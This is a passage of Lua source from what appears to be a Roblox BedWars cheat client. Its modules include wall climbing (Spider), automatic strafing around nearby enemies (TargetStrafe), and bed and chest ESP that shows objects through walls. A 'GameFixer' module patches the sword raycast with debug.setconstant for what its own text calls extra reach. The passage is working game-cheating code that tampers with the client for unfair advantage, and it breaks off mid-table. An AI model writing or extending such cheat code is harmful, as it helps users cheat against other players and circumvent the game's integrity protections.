		Name = "Damage Boost",
		Function = function() end,
		Default = true
	})
	SpeedJump = Speed.CreateToggle({
		Name = "AutoJump", 
		Function = function(callback) 
			if SpeedJumpHeight.Object then SpeedJumpHeight.Object.Visible = callback end
			if SpeedJumpAlways.Object then
				SpeedJump.Object.ToggleArrow.Visible = callback
				SpeedJumpAlways.Object.Visible = callback
			end
			if SpeedJumpSound.Object then SpeedJumpSound.Object.Visible = callback end
			if SpeedJumpVanilla.Object then SpeedJumpVanilla.Object.Visible = callback end
		end,
		Default = true
	})
	SpeedJumpHeight = Speed.CreateSlider({
		Name = "Jump Height",
		Min = 0,
		Max = 30,
		Default = 25,
		Function = function() end
	})
	SpeedJumpAlways = Speed.CreateToggle({
		Name = "Always Jump",
		Function = function() end
	})
	SpeedJumpSound = Speed.CreateToggle({
		Name = "Jump Sound",
		Function = function() end
	})
	SpeedJumpVanilla = Speed.CreateToggle({
		Name = "Real Jump",
		Function = function() end
	})
	SpeedAnimation = Speed.CreateToggle({
		Name = "Slowdown Anim",
		Function = function() end
	})
end)

runFunction(function()
	local function roundpos(dir, pos, size)
		local suc, res = pcall(function() return Vector3.new(math.clamp(dir.X, pos.X - (size.X / 2), pos.X + (size.X / 2)), math.clamp(dir.Y, pos.Y - (size.Y / 2), pos.Y + (size.Y / 2)), math.clamp(dir.Z, pos.Z - (size.Z / 2), pos.Z + (size.Z / 2))) end)
		return suc and res or Vector3.zero
	end

	local Spider = {Enabled = false}
	local SpiderSpeed = {Value = 0}
	local SpiderMode = {Value = "Normal"}
	local SpiderPart
	Spider = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "Spider",
		Function = function(callback)
			if callback then
				table.insert(Spider.Connections, inputService.InputBegan:Connect(function(input1)
					if input1.KeyCode == Enum.KeyCode.LeftShift then 
						holdingshift = true
					end
				end))
				table.insert(Spider.Connections, inputService.InputEnded:Connect(function(input1)
					if input1.KeyCode == Enum.KeyCode.LeftShift then 
						holdingshift = false
					end
				end))
				RunLoops:BindToHeartbeat("Spider", function()
					if entityLibrary.isAlive and (GuiLibrary.ObjectsThatCanBeSaved.PhaseOptionsButton.Api.Enabled == false or holdingshift == false) then
						if SpiderMode.Value == "Normal" then
							local vec = entityLibrary.character.Humanoid.MoveDirection * 2
							local newray = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + (vec + Vector3.new(0, 0.1, 0)))
							local newray2 = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + (vec - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight, 0)))
							if newray and (not newray.CanCollide) then newray = nil end 
							if newray2 and (not newray2.CanCollide) then newray2 = nil end 
							if spiderActive and (not newray) and (not newray2) then
								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, 0, entityLibrary.character.HumanoidRootPart.Velocity.Z)
							end
							spiderActive = ((newray or newray2) and true or false)
							if (newray or newray2) then
								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(newray2 and newray == nil and entityLibrary.character.HumanoidRootPart.Velocity.X or 0, SpiderSpeed.Value, newray2 and newray == nil and entityLibrary.character.HumanoidRootPart.Velocity.Z or 0)
							end
						else
							if not SpiderPart then 
								SpiderPart = Instance.new("TrussPart")
								SpiderPart.Size = Vector3.new(2, 2, 2)
								SpiderPart.Transparency = 1
								SpiderPart.Anchored = true
								SpiderPart.Parent = gameCamera
							end
							local newray2, newray2pos = getPlacedBlock(entityLibrary.character.HumanoidRootPart.Position + ((entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 1.5) - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight, 0)))
							if newray2 and (not newray2.CanCollide) then newray2 = nil end
							spiderActive = (newray2 and true or false)
							if newray2 then 
								newray2pos = newray2pos * 3
								local newpos = roundpos(entityLibrary.character.HumanoidRootPart.Position, Vector3.new(newray2pos.X, math.min(entityLibrary.character.HumanoidRootPart.Position.Y, newray2pos.Y), newray2pos.Z), Vector3.new(1.1, 1.1, 1.1))
								SpiderPart.Position = newpos
							else
								SpiderPart.Position = Vector3.zero
							end
						end
					end
				end)
			else
				if SpiderPart then SpiderPart:Destroy() end
				RunLoops:UnbindFromHeartbeat("Spider")
				holdingshift = false
			end
		end,
		HoverText = "Lets you climb up walls"
	})
	SpiderMode = Spider.CreateDropdown({
		Name = "Mode",
		List = {"Normal", "Classic"},
		Function = function() 
			if SpiderPart then SpiderPart:Destroy() end
		end
	})
	SpiderSpeed = Spider.CreateSlider({
		Name = "Speed",
		Min = 0,
		Max = 40,
		Function = function() end,
		Default = 40
	})
end)

runFunction(function()
	local TargetStrafe = {Enabled = false}
	local TargetStrafeRange = {Value = 18}
	local oldmove
	local controlmodule
	local block
	TargetStrafe = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "TargetStrafe",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					if not controlmodule then
						local suc = pcall(function() controlmodule = require(lplr.PlayerScripts.PlayerModule).controls end)
						if not suc then controlmodule = {} end
					end
					oldmove = controlmodule.moveFunction
					local ang = 0
					local oldplr
					block = Instance.new("Part")
					block.Anchored = true
					block.CanCollide = false
					block.Parent = gameCamera
					controlmodule.moveFunction = function(Self, vec, facecam, ...)
						if entityLibrary.isAlive then
							local plr = AllNearPosition(TargetStrafeRange.Value + 5, 10)[1]
							plr = plr and (not workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, (plr.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position), bedwarsStore.blockRaycast)) and workspace:Raycast(plr.RootPart.Position, Vector3.new(0, -70, 0), bedwarsStore.blockRaycast) and plr or nil
							if plr ~= oldplr then
								if plr then
									local x, y, z = CFrame.new(plr.RootPart.Position, entityLibrary.character.HumanoidRootPart.Position):ToEulerAnglesXYZ()
									ang = math.deg(z)
								end
								oldplr = plr
							end
							if plr then 
								facecam = false
								local localPos = CFrame.new(plr.RootPart.Position)
								local ray = workspace:Blockcast(localPos, Vector3.new(3, 3, 3), CFrame.Angles(0, math.rad(ang), 0).lookVector * TargetStrafeRange.Value, bedwarsStore.blockRaycast)
								local newPos = localPos + (CFrame.Angles(0, math.rad(ang), 0).lookVector * (ray and ray.Distance - 1 or TargetStrafeRange.Value))
								local factor = getSpeed() > 0 and 6 or 4
								if not workspace:Raycast(newPos.p, Vector3.new(0, -70, 0), bedwarsStore.blockRaycast) then 
									newPos = localPos
									factor = 40
								end
								if ((entityLibrary.character.HumanoidRootPart.Position * Vector3.new(1, 0, 1)) - (newPos.p * Vector3.new(1, 0, 1))).Magnitude < 4 or ray then
									ang = ang + factor % 360
								end
								block.Position = newPos.p
								vec = (newPos.p - entityLibrary.character.HumanoidRootPart.Position) * Vector3.new(1, 0, 1)
							end
						end
						return oldmove(Self, vec, facecam, ...)
					end
				end)
			else
				block:Destroy()
				controlmodule.moveFunction = oldmove
			end
		end
	})
	TargetStrafeRange = TargetStrafe.CreateSlider({
		Name = "Range",
		Min = 0,
		Max = 18,
		Function = function() end
	})
end)

runFunction(function()
	local BedESP = {Enabled = false}
	local BedESPFolder = Instance.new("Folder")
	BedESPFolder.Name = "BedESPFolder"
	BedESPFolder.Parent = GuiLibrary.MainGui
	local BedESPTable = {}
	local BedESPColor = {Value = 0.44}
	local BedESPTransparency = {Value = 1}
	local BedESPOnTop = {Enabled = true}
	BedESP = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "BedESP",
		Function = function(callback) 
			if callback then
				table.insert(BedESP.Connections, collectionService:GetInstanceAddedSignal("bed"):Connect(function(bed)
					task.wait(0.2)
					if not BedESP.Enabled then return end
					local BedFolder = Instance.new("Folder")
					BedFolder.Parent = BedESPFolder
					BedESPTable[bed] = BedFolder
					for bedespnumber, bedesppart in pairs(bed:GetChildren()) do
						local boxhandle = Instance.new("BoxHandleAdornment")
						boxhandle.Size = bedesppart.Size + Vector3.new(.01, .01, .01)
						boxhandle.AlwaysOnTop = true
						boxhandle.ZIndex = (bedesppart.Name == "Covers" and 10 or 0)
						boxhandle.Visible = true
						boxhandle.Adornee = bedesppart
						boxhandle.Color3 = bedesppart.Color
						boxhandle.Name = bedespnumber
						boxhandle.Parent = BedFolder
					end
				end))
				table.insert(BedESP.Connections, collectionService:GetInstanceRemovedSignal("bed"):Connect(function(bed)
					if BedESPTable[bed] then 
						BedESPTable[bed]:Destroy()
						BedESPTable[bed] = nil
					end
				end))
				for i, bed in pairs(collectionService:GetTagged("bed")) do 
					local BedFolder = Instance.new("Folder")
					BedFolder.Parent = BedESPFolder
					BedESPTable[bed] = BedFolder
					for bedespnumber, bedesppart in pairs(bed:GetChildren()) do
						if bedesppart:IsA("BasePart") then
							local boxhandle = Instance.new("BoxHandleAdornment")
							boxhandle.Size = bedesppart.Size + Vector3.new(.01, .01, .01)
							boxhandle.AlwaysOnTop = true
							boxhandle.ZIndex = (bedesppart.Name == "Covers" and 10 or 0)
							boxhandle.Visible = true
							boxhandle.Adornee = bedesppart
							boxhandle.Color3 = bedesppart.Color
							boxhandle.Parent = BedFolder
						end
					end
				end
			else
				BedESPFolder:ClearAllChildren()
				table.clear(BedESPTable)
			end
		end,
		HoverText = "Render Beds through walls" 
	})
end)

runFunction(function()
	local function getallblocks2(pos, normal)
		local blocks = {}
		local lastfound = nil
		for i = 1, 20 do
			local blockpos = (pos + (Vector3.FromNormalId(normal) * (i * 3)))
			local extrablock = getPlacedBlock(blockpos)
			local covered = true
			if extrablock and extrablock.Parent ~= nil then
				if bedwars.BlockController:isBlockBreakable({blockPosition = blockpos}, lplr) then
					table.insert(blocks, extrablock:GetAttribute("NoBreak") and "unbreakable" or extrablock.Name)
				else
					table.insert(blocks, "unbreakable")
					break
				end
				lastfound = extrablock
				if covered == false then
					break
				end
			else
				break
			end
		end
		return blocks
	end

	local function getallbedblocks(pos)
		local blocks = {}
		for i,v in pairs(cachedNormalSides) do
			for i2,v2 in pairs(getallblocks2(pos, v)) do	
				if table.find(blocks, v2) == nil and v2 ~= "bed" then
					table.insert(blocks, v2)
				end
			end
			for i2,v2 in pairs(getallblocks2(pos + Vector3.new(0, 0, 3), v)) do	
				if table.find(blocks, v2) == nil and v2 ~= "bed" then
					table.insert(blocks, v2)
				end
			end
		end
		return blocks
	end

	local function refreshAdornee(v)
		local bedblocks = getallbedblocks(v.Adornee.Position)
		for i2,v2 in pairs(v.Frame:GetChildren()) do
			if v2:IsA("ImageLabel") then
				v2:Remove()
			end
		end
		for i3,v3 in pairs(bedblocks) do
			local blockimage = Instance.new("ImageLabel")
			blockimage.Size = UDim2.new(0, 32, 0, 32)
			blockimage.BackgroundTransparency = 1
			blockimage.Image = bedwars.getIcon({itemType = v3}, true)
			blockimage.Parent = v.Frame
		end
	end

	local BedPlatesFolder = Instance.new("Folder")
	BedPlatesFolder.Name = "BedPlatesFolder"
	BedPlatesFolder.Parent = GuiLibrary.MainGui
	local BedPlatesTable = {}
	local BedPlates = {Enabled = false}

	local function addBed(v)
		local billboard = Instance.new("BillboardGui")
		billboard.Parent = BedPlatesFolder
		billboard.Name = "bed"
		billboard.StudsOffsetWorldSpace = Vector3.new(0, 3, 1.5)
		billboard.Size = UDim2.new(0, 42, 0, 42)
		billboard.AlwaysOnTop = true
		billboard.Adornee = v
		BedPlatesTable[v] = billboard
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(1, 0, 1, 0)
		frame.BackgroundColor3 = Color3.new(0, 0, 0)
		frame.BackgroundTransparency = 0.5
		frame.Parent = billboard
		local uilistlayout = Instance.new("UIListLayout")
		uilistlayout.FillDirection = Enum.FillDirection.Horizontal
		uilistlayout.Padding = UDim.new(0, 4)
		uilistlayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uilistlayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uilistlayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			billboard.Size = UDim2.new(0, math.max(uilistlayout.AbsoluteContentSize.X + 12, 42), 0, 42)
		end)
		uilistlayout.Parent = frame
		local uicorner = Instance.new("UICorner")
		uicorner.CornerRadius = UDim.new(0, 4)
		uicorner.Parent = frame
		refreshAdornee(billboard)
	end

	BedPlates = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "BedPlates",
		Function = function(callback)
			if callback then
				table.insert(BedPlates.Connections, vapeEvents.PlaceBlockEvent.Event:Connect(function(p5)
					for i, v in pairs(BedPlatesFolder:GetChildren()) do 
						if v.Adornee then
							if ((p5.blockRef.blockPosition * 3) - v.Adornee.Position).magnitude <= 20 then
								refreshAdornee(v)
							end
						end
					end
				end))
				table.insert(BedPlates.Connections, vapeEvents.BreakBlockEvent.Event:Connect(function(p5)
					for i, v in pairs(BedPlatesFolder:GetChildren()) do 
						if v.Adornee then
							if ((p5.blockRef.blockPosition * 3) - v.Adornee.Position).magnitude <= 20 then
								refreshAdornee(v)
							end
						end
					end
				end))
				table.insert(BedPlates.Connections, collectionService:GetInstanceAddedSignal("bed"):Connect(function(v)
					addBed(v)
				end))
				table.insert(BedPlates.Connections, collectionService:GetInstanceRemovedSignal("bed"):Connect(function(v)
					if BedPlatesTable[v] then 
						BedPlatesTable[v]:Destroy()
						BedPlatesTable[v] = nil
					end
				end))
				for i, v in pairs(collectionService:GetTagged("bed")) do
					addBed(v)
				end
			else
				BedPlatesFolder:ClearAllChildren()
			end
		end
	})
end)

runFunction(function()
	local ChestESPList = {ObjectList = {}, RefreshList = function() end}
	local function nearchestitem(item)
		for i,v in pairs(ChestESPList.ObjectList) do 
			if item:find(v) then return v end
		end
	end
	local function refreshAdornee(v)
		local chest = v.Adornee.ChestFolderValue.Value
        local chestitems = chest and chest:GetChildren() or {}
		for i2,v2 in pairs(v.Frame:GetChildren()) do
			if v2:IsA("ImageLabel") then
				v2:Remove()
			end
		end
		v.Enabled = false
		local alreadygot = {}
		for itemNumber, item in pairs(chestitems) do
			if alreadygot[item.Name] == nil and (table.find(ChestESPList.ObjectList, item.Name) or nearchestitem(item.Name)) then 
				alreadygot[item.Name] = true
				v.Enabled = true
                local blockimage = Instance.new("ImageLabel")
                blockimage.Size = UDim2.new(0, 32, 0, 32)
                blockimage.BackgroundTransparency = 1
                blockimage.Image = bedwars.getIcon({itemType = item.Name}, true)
                blockimage.Parent = v.Frame
            end
		end
	end

	local ChestESPFolder = Instance.new("Folder")
	ChestESPFolder.Name = "ChestESPFolder"
	ChestESPFolder.Parent = GuiLibrary.MainGui
	local ChestESP = {Enabled = false}
	local ChestESPBackground = {Enabled = true}

	local function chestfunc(v)
		task.spawn(function()
			local billboard = Instance.new("BillboardGui")
			billboard.Parent = ChestESPFolder
			billboard.Name = "chest"
			billboard.StudsOffsetWorldSpace = Vector3.new(0, 3, 0)
			billboard.Size = UDim2.new(0, 42, 0, 42)
			billboard.AlwaysOnTop = true
			billboard.Adornee = v
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundColor3 = Color3.new(0, 0, 0)
			frame.BackgroundTransparency = ChestESPBackground.Enabled and 0.5 or 1
			frame.Parent = billboard
			local uilistlayout = Instance.new("UIListLayout")
			uilistlayout.FillDirection = Enum.FillDirection.Horizontal
			uilistlayout.Padding = UDim.new(0, 4)
			uilistlayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uilistlayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uilistlayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
				billboard.Size = UDim2.new(0, math.max(uilistlayout.AbsoluteContentSize.X + 12, 42), 0, 42)
			end)
			uilistlayout.Parent = frame
			local uicorner = Instance.new("UICorner")
			uicorner.CornerRadius = UDim.new(0, 4)
			uicorner.Parent = frame
			local chest = v:WaitForChild("ChestFolderValue").Value
			if chest then 
				table.insert(ChestESP.Connections, chest.ChildAdded:Connect(function(item)
					if table.find(ChestESPList.ObjectList, item.Name) or nearchestitem(item.Name) then 
						refreshAdornee(billboard)
					end
				end))
				table.insert(ChestESP.Connections, chest.ChildRemoved:Connect(function(item)
					if table.find(ChestESPList.ObjectList, item.Name) or nearchestitem(item.Name) then 
						refreshAdornee(billboard)
					end
				end))
				refreshAdornee(billboard)
			end
		end)
	end

	ChestESP = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "ChestESP",
		Function = function(callback)
			if callback then
				task.spawn(function()
					table.insert(ChestESP.Connections, collectionService:GetInstanceAddedSignal("chest"):Connect(chestfunc))
					for i,v in pairs(collectionService:GetTagged("chest")) do chestfunc(v) end
				end)
			else
				ChestESPFolder:ClearAllChildren()
			end
		end
	})
	ChestESPList = ChestESP.CreateTextList({
		Name = "ItemList",
		TempText = "item or part of item",
		AddFunction = function()
			if ChestESP.Enabled then 
				ChestESP.ToggleButton(false)
				ChestESP.ToggleButton(false)
			end
		end,
		RemoveFunction = function()
			if ChestESP.Enabled then 
				ChestESP.ToggleButton(false)
				ChestESP.ToggleButton(false)
			end
		end
	})
	ChestESPBackground = ChestESP.CreateToggle({
		Name = "Background",
		Function = function()
			if ChestESP.Enabled then 
				ChestESP.ToggleButton(false)
				ChestESP.ToggleButton(false)
			end
		end,
		Default = true
	})
end)

runFunction(function()
	local FieldOfViewValue = {Value = 70}
	local oldfov
	local oldfov2
	local FieldOfView = {Enabled = false}
	local FieldOfViewZoom = {Enabled = false}
	FieldOfView = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "FOVChanger",
		Function = function(callback)
			if callback then
				if FieldOfViewZoom.Enabled then
					task.spawn(function()
						repeat
							task.wait()
						until not inputService:IsKeyDown(Enum.KeyCode[FieldOfView.Keybind ~= "" and FieldOfView.Keybind or "C"])
						if FieldOfView.Enabled then
							FieldOfView.ToggleButton(false)
						end
					end)
				end
				oldfov = bedwars.FovController.setFOV
				oldfov2 = bedwars.FovController.getFOV
				bedwars.FovController.setFOV = function(self, fov) return oldfov(self, FieldOfViewValue.Value) end
				bedwars.FovController.getFOV = function(self, fov) return FieldOfViewValue.Value end
			else
				bedwars.FovController.setFOV = oldfov
				bedwars.FovController.getFOV = oldfov2
			end
			bedwars.FovController:setFOV(bedwars.ClientStoreHandler:getState().Settings.fov)
		end
	})
	FieldOfViewValue = FieldOfView.CreateSlider({
		Name = "FOV",
		Min = 30,
		Max = 120,
		Function = function(val)
			if FieldOfView.Enabled then
				bedwars.FovController:setFOV(bedwars.ClientStoreHandler:getState().Settings.fov)
			end
		end
	})
	FieldOfViewZoom = FieldOfView.CreateToggle({
		Name = "Zoom",
		Function = function() end,
		HoverText = "optifine zoom lol"
	})
end)

runFunction(function()
	local old
	local old2
	local oldhitpart 
	local FPSBoost = {Enabled = false}
	local removetextures = {Enabled = false}
	local removetexturessmooth = {Enabled = false}
	local fpsboostdamageindicator = {Enabled = false}
	local fpsboostdamageeffect = {Enabled = false}
	local fpsboostkilleffect = {Enabled = false}
	local originaltextures = {}
	local originaleffects = {}

	local function fpsboosttextures()
		task.spawn(function()
			repeat task.wait() until bedwarsStore.matchState ~= 0
			for i,v in pairs(bedwarsStore.blocks) do
				if v:GetAttribute("PlacedByUserId") == 0 then
					v.Material = FPSBoost.Enabled and removetextures.Enabled and Enum.Material.SmoothPlastic or (v.Name:find("glass") and Enum.Material.SmoothPlastic or Enum.Material.Fabric)
					originaltextures[v] = originaltextures[v] or v.MaterialVariant
					v.MaterialVariant = FPSBoost.Enabled and removetextures.Enabled and "" or originaltextures[v]
					for i2,v2 in pairs(v:GetChildren()) do 
						pcall(function() 
							v2.Material = FPSBoost.Enabled and removetextures.Enabled and Enum.Material.SmoothPlastic or (v.Name:find("glass") and Enum.Material.SmoothPlastic or Enum.Material.Fabric)
							originaltextures[v2] = originaltextures[v2] or v2.MaterialVariant
							v2.MaterialVariant = FPSBoost.Enabled and removetextures.Enabled and "" or originaltextures[v2]
						end)
					end
				end
			end
		end)
	end

	FPSBoost = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "FPSBoost",
		Function = function(callback)
			local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
			if callback then
				wasenabled = true
				fpsboosttextures()
				if fpsboostdamageindicator.Enabled then 
					damagetab.strokeThickness = 0
					damagetab.textSize = 0
					damagetab.blowUpDuration = 0
					damagetab.blowUpSize = 0
				end
				if fpsboostkilleffect.Enabled then 
					for i,v in pairs(bedwars.KillEffectController.killEffects) do 
						originaleffects[i] = v
						bedwars.KillEffectController.killEffects[i] = {new = function(char) return {onKill = function() end, isPlayDefaultKillEffect = function() return char == lplr.Character end} end}
					end
				end
				if fpsboostdamageeffect.Enabled then 
					oldhitpart = bedwars.DamageIndicatorController.hitEffectPart
					bedwars.DamageIndicatorController.hitEffectPart = nil
				end
				old = bedwars.HighlightController.highlight
				old2 = getmetatable(bedwars.StopwatchController).tweenOutGhost
				local highlighttable = {}
				getmetatable(bedwars.StopwatchController).tweenOutGhost = function(p17, p18)
					p18:Destroy()
				end
				bedwars.HighlightController.highlight = function() end
			else
				for i,v in pairs(originaleffects) do 
					bedwars.KillEffectController.killEffects[i] = v
				end
				fpsboosttextures()
				if oldhitpart then 
					bedwars.DamageIndicatorController.hitEffectPart = oldhitpart
				end
				debug.setupvalue(bedwars.KillEffectController.KnitStart, 2, require(lplr.PlayerScripts.TS["client-sync-events"]).ClientSyncEvents)
				damagetab.strokeThickness = 1.5
				damagetab.textSize = 28
				damagetab.blowUpDuration = 0.125
				damagetab.blowUpSize = 76
				debug.setupvalue(bedwars.DamageIndicator, 10, tweenService)
				if bedwars.DamageIndicatorController.hitEffectPart then 
					bedwars.DamageIndicatorController.hitEffectPart.Attachment.Cubes.Enabled = true
					bedwars.DamageIndicatorController.hitEffectPart.Attachment.Shards.Enabled = true
				end
				bedwars.HighlightController.highlight = old
				getmetatable(bedwars.StopwatchController).tweenOutGhost = old2
				old = nil
				old2 = nil
			end
		end
	})
	removetextures = FPSBoost.CreateToggle({
		Name = "Remove Textures",
		Function = function(callback) if FPSBoost.Enabled then FPSBoost.ToggleButton(false) FPSBoost.ToggleButton(false) end end
	})
	fpsboostdamageindicator = FPSBoost.CreateToggle({
		Name = "Remove Damage Indicator",
		Function = function(callback) if FPSBoost.Enabled then FPSBoost.ToggleButton(false) FPSBoost.ToggleButton(false) end end
	})
	fpsboostdamageeffect = FPSBoost.CreateToggle({
		Name = "Remove Damage Effect",
		Function = function(callback) if FPSBoost.Enabled then FPSBoost.ToggleButton(false) FPSBoost.ToggleButton(false) end end
	})
	fpsboostkilleffect = FPSBoost.CreateToggle({
		Name = "Remove Kill Effect",
		Function = function(callback) if FPSBoost.Enabled then FPSBoost.ToggleButton(false) FPSBoost.ToggleButton(false) end end
	})
end)

runFunction(function()
	local GameFixer = {Enabled = false}
	local GameFixerHit = {Enabled = false}
	GameFixer = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
		Name = "GameFixer",
		Function = function(callback)
			if callback then
				if GameFixerHit.Enabled then 
					debug.setconstant(bedwars.SwordController.swingSwordAtMouse, 23, "raycast")
					debug.setupvalue(bedwars.SwordController.swingSwordAtMouse, 4, bedwars.QueryUtil)
				end
				debug.setconstant(bedwars.QueueCard.render, 9, 0.1)
			else
				if GameFixerHit.Enabled then 
					debug.setconstant(bedwars.SwordController.swingSwordAtMouse, 23, "Raycast")
					debug.setupvalue(bedwars.SwordController.swingSwordAtMouse, 4, workspace)
				end
				debug.setconstant(bedwars.QueueCard.render, 9, 0.01)
			end
		end,
		HoverText = "Fixes game bugs"
	})
	GameFixerHit = GameFixer.CreateToggle({
		Name = "Hit Fix",
		Function = function(callback)
			if GameFixer.Enabled then
				if callback then 
					debug.setconstant(bedwars.SwordController.swingSwordAtMouse, 23, "raycast")
					debug.setupvalue(bedwars.SwordController.swingSwordAtMouse, 4, bedwars.QueryUtil)
				else
					debug.setconstant(bedwars.SwordController.swingSwordAtMouse, 23, "Raycast")
					debug.setupvalue(bedwars.SwordController.swingSwordAtMouse, 4, workspace)
				end
			end
		end,
		HoverText = "Fixes the raycast function used for extra reach",
		Default = true
	})
end)

runFunction(function()
	local transformed = false
	local GameTheme = {Enabled = false}
	local GameThemeMode = {Value = "GameTheme"}

	local themefunctions = {
		Old = function()
			task.spawn(function()
				local oldbedwarstabofimages = '{"clay_orange":"rbxassetid://7017703219","iron":"rbxassetid://6850537969","glass":"rbxassetid://6909521321","log_spruce":"rbxassetid://6874161124","ice":"rbxassetid://6874651262","marble":"rbxassetid://6594536339","zipline_base":"rbxassetid://7051148904","iron_helmet":"rbxassetid://6874272559","marble_pillar":"rbxassetid://6909323822","clay_dark_green":"rbxassetid://6763635916","wood_plank_birch":"rbxassetid://6768647328","watering_can":"rbxassetid://6915423754","emerald_helmet":"rbxassetid://6931675766","pie":"rbxassetid://6985761399","wood_plank_spruce":"rbxassetid://6768615964","diamond_chestplate":"rbxassetid://6874272898","wool_pink":"rbxassetid://6910479863","wool_blue":"rbxassetid://6910480234","wood_plank_oak":"rbxassetid://6910418127","diamond_boots":"rbxassetid://6874272964","clay_yellow":"rbxassetid://4991097283","tnt":"rbxassetid://6856168996","lasso":"rbxassetid://7192710930","clay_purple":"rbxassetid://6856099740","melon_seeds":"rbxassetid://6956387796","apple":"rbxassetid://6985765179","carrot_seeds":"rbxassetid://6956387835","log_oak":"rbxassetid://6763678414","emerald_chestplate":"rbxassetid://6931675868","wool_yellow":"rbxassetid://6910479606","emerald_boots":"rbxassetid://6931675942","clay_light_brown":"rbxassetid://6874651634","balloon":"rbxassetid://7122143895","cannon":"rbxassetid://7121221753","leather_boots":"rbxassetid://6855466456","melon":"rbxassetid://6915428682","wool_white":"rbxassetid://6910387332","log_birch":"rbxassetid://6763678414","clay_pink":"rbxassetid://6856283410","grass":"rbxassetid://6773447725","obsidian":"rbxassetid://6910443317","shield":"rbxassetid://7051149149","red_sandstone":"rbxassetid://6708703895","diamond_helmet":"rbxassetid://6874272793","wool_orange":"rbxassetid://6910479956","log_hickory":"rbxassetid://7017706899","guitar":"rbxassetid://7085044606","wool_purple":"rbxassetid://6910479777","diamond":"rbxassetid://6850538161","iron_chestplate":"rbxassetid://6874272631","slime_block":"rbxassetid://6869284566","stone_brick":"rbxassetid://6910394475","hammer":"rbxassetid://6955848801","ceramic":"rbxassetid://6910426690","wood_plank_maple":"rbxassetid://6768632085","leather_helmet":"rbxassetid://6855466216","stone":"rbxassetid://6763635916","slate_brick":"rbxassetid://6708836267","sandstone":"rbxassetid://6708657090","snow":"rbxassetid://6874651192","wool_red":"rbxassetid://6910479695","leather_chestplate":"rbxassetid://6876833204","clay_red":"rbxassetid://6856283323","wool_green":"rbxassetid://6910480050","clay_white":"rbxassetid://7017705325","wool_cyan":"rbxassetid://6910480152","clay_black":"rbxassetid://5890435474","sand":"rbxassetid://6187018940","clay_light_green":"rbxassetid://6856099550","clay_dark_brown":"rbxassetid://6874651325","carrot":"rbxassetid://3677675280","clay":"rbxassetid://6856190168","iron_boots":"rbxassetid://6874272718","emerald":"rbxassetid://6850538075","zipline":"rbxassetid://7051148904"}'
				local oldbedwarsicontab = game:GetService("HttpService"):JSONDecode(oldbedwarstabofimages)
				local oldbedwarssoundtable = {
					["QUEUE_JOIN"] = "rbxassetid://6691735519",
					["QUEUE_MATCH_FOUND"] = "rbxassetid://6768247187",
					["UI_CLICK"] = "rbxassetid://6732690176",
					["UI_OPEN"] = "rbxassetid://6732607930",
					["BEDWARS_UPGRADE_SUCCESS"] = "rbxassetid://6760677364",
					["BEDWARS_PURCHASE_ITEM"] = "rbxassetid://6760677364",
					["SWORD_SWING_1"] = "rbxassetid://6760544639",
					["SWORD_SWING_2"] = "rbxassetid://6760544595",
					["DAMAGE_1"] = "rbxassetid://6765457325",
					["DAMAGE_2"] = "rbxassetid://6765470975",
					["DAMAGE_3"] = "rbxassetid://6765470941",
					["CROP_HARVEST"] = "rbxassetid://4864122196",
					["CROP_PLANT_1"] = "rbxassetid://5483943277",
					["CROP_PLANT_2"] = "rbxassetid://5483943479",
					["CROP_PLANT_3"] = "rbxassetid://5483943723",
					["ARMOR_EQUIP"] = "rbxassetid://6760627839",
					["ARMOR_UNEQUIP"] = "rbxassetid://6760625788",
					["PICKUP_ITEM_DROP"] = "rbxassetid://6768578304",
					["PARTY_INCOMING_INVITE"] = "rbxassetid://6732495464",
					["ERROR_NOTIFICATION"] = "rbxassetid://6732495464",
					["INFO_NOTIFICATION"] = "rbxassetid://6732495464",
					["END_GAME"] = "rbxassetid://6246476959",
					["GENERIC_BLOCK_PLACE"] = "rbxassetid://4842910664",
					["GENERIC_BLOCK_BREAK"] = "rbxassetid://4819966893",
					["GRASS_BREAK"] = "rbxassetid://5282847153",
					["WOOD_BREAK"] = "rbxassetid://4819966893",
					["STONE_BREAK"] = "rbxassetid://6328287211",
					["WOOL_BREAK"] = "rbxassetid://4842910664",
					["TNT_EXPLODE_1"] = "rbxassetid://7192313632",
					["TNT_HISS_1"] = "rbxassetid://7192313423",
					["FIREBALL_EXPLODE"] = "rbxassetid://6855723746",
					["SLIME_BLOCK_BOUNCE"] = "rbxassetid://6857999096",
					["SLIME_BLOCK_BREAK"] = "rbxassetid://6857999170",
					["SLIME_BLOCK_HIT"] = "rbxassetid://6857999148",
					["SLIME_BLOCK_PLACE"] = "rbxassetid://6857999119",
					["BOW_DRAW"] = "rbxassetid://6866062236",
					["BOW_FIRE"] = "rbxassetid://6866062104",
					["ARROW_HIT"] = "rbxassetid://6866062188",
					["ARROW_IMPACT"] = "rbxassetid://6866062148",
